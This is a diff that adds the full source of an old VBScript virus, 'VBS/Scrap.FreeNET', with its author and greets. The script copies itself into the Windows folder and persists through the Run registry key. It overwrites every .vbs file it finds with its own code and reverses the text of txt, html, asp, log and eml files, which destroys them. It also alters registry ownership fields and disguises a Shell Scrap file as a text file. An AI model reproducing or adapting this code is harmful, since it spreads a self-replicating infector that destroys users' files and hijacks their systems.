@@ -1,0 +1,94 @@
+'Name  : VBS/Scrap.FreeNET
+'Author: Total K
+'Origin: UK
+'
+'Greets go out to: NocternaL, Drakatania, Coded HavIK and the UEE.
+'
+On Error Resume Next
+Randomize
+Dim T,R,W1,F1,D1,X
+T="Total Konfuzion"
+R="VBS/Scrap.FreeNET"
+Set W1=CreateObject("WScript.Shell")
+W1.RegWrite"HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\","niB elcyceR"
+W1.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner",T
+W1.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization",R
+Set F1=CreateObject("Scripting.FileSystemObject")
+Set D1=F1.GetSpecialFolder(0)
+Set X=F1.GetFile(WScript.ScriptFullName)
+X.Copy D1&"\FNT.drv.vbs"
+F1.CopyFile "FreeNET.TXT.shs",D1&"\FreeNET.TXT.shs"
+Call GetFolder(D1)
+Call GetFolder(D1&"\Desktop")
+Call GetFolder("C:\My Documents")
+Call GetFolder(D1&"\Web")
+Call GetFolder(D1&"\Web\Wallpaper")
+Call GetFolder(D1&"\Help")
+Call GetFolder(D1&"\Temp")
+Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
+Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
+Call GetFolder("C:\Inetpub\wwwroot")
+Call FreeNET(D1&"\FreeNET_List.txt")
+Sub GetFolder(IP)
+On Error Resume Next
+If F1.FolderExists(IP) Then
+Do
+Set F2=F1.GetFolder(IP)
+IP=F1.GetParentFolderName(IP)
+Set F3=F2.Files
+For Each T1 In F3
+EN=LCase(F1.GetExtensionName(T1.Name))
+If EN="vbs" Then
+Set F4=F1.OpenTextFile(WScript.ScriptFullName,1)
+FS=F4.Size
+FC=F4.Read(FS)
+F4.Close()
+Set F4.OpenTextFile(T1.Name,2)
+F4.Write(FC)
+F4.Close()
+Else
+If EN="txt" Or EN="html" Or EN="htm" Or EN="log" Or EN="asp" Or EN="eml" Then
+Set F4=F1.OpenTextFile(T1.Path,1,False)
+If F4.ReadLine<>"'"&R&" by: "&T Then
+F4.Close()
+GetFile(T1.Path)
+Else
+F4.Close()
+End If
+End If
+Next
+Loop Until F3.IsRootFolder=True
+End If
+End Sub
+Sub GetFile(GFN)
+Set F4=F1.GetFile(GFN)
+F4.Attributes=0
+FS=F4.Size
+Set F4=F1.OpenTextFile(GFN,1,False)
+FC=F4.Read(FS)
+F4.Close()
+Set F4=F1.OpenTextFile(GFN,2,False)
+F4.WriteLine("'"&R&" by: "&T)
+B=StrReverse(FC)
+F4.Write(B)
+F4.Close()
+End Sub
+Sub FreeNET(FN)
+If Not (F1.FileExists(D1&"\FreeNET_List.txt")) Then
+Set F4=F1.CreateTextFile(FN,2,False)
+F4.WriteLine("-=( FreeNET Access )=-")
+F4.WriteBlankLines(2)
+F4.WriteLine("BT Internet         -   http://www.btinternet.com")
+F4.WriteLine("AltaVista           -   http://www.altavista.com")
+F4.WriteLine("X-Stream            -   http://www.x-stream.co.uk")
+F4.Close()
+W1.Run(FN)
+End If
+End Sub
+Dim M1
+Dim S
+I=""
+I=W1.RegRead("HKEY_CLASSES_ROOT\"&W1.RegRead("HKEY_CLASSES_ROOT\.txt")&"\DefaultIcon\")
+If I<>"" Then W1.RegWrite"HKEY_CLASSES_ROOT\ShellScrap\DefaultIcon",I
+W1.RegWrite"HKEY_CLASSES_ROOT\txtfile\AlwaysShowExt",""
+W1.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\FreeNET","WScript.exe "&D1&"\FNT.drv.vbs"
